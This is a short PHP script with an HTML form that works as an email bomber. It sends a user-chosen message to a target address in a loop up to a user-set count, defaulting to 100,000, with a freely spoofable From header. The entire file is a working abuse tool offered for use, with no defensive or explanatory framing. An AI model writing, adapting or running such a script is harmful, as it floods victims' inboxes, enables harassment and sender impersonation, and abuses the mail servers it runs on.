<?php  
 
    $num = 1;
    $email = $_POST['email'];
    $spam = $_POST['spam'];
    $subject = $_POST['subject'];
    $message = $_POST['message'];
    $from = $_POST['from'];
    $send = $_POST['send'];
    if($spam==' ')
    {
      $spam = 100000;
    }
   
   
    if($spam!='' && $email=='')
    {
        die('Please enter an email');
    }
   
    if($email != '')
    {
        while($num<=$spam)
        {
            mail ($email, $subject, $message, "From: " . $from);
            echo $num . "<br>";
            $num++;
        }  
    }
?>
 
<html>
<body>
 
    <form action="email.php" method="post"><br>
        Email: <input type="text" name="email" /><br>
        How many times to spam: <input type="text" name="spam" /><br>
        Subject: <input type="text" name="subject" /><br>
        Message: <TEXTAREA NAME="message" ROWS=6 COLS=40></TEXTAREA><br>
        From: <input type="text" name="from" /><br>
        <input type="submit" value="send" /><input type="reset" />
    </form>
</body>
</html>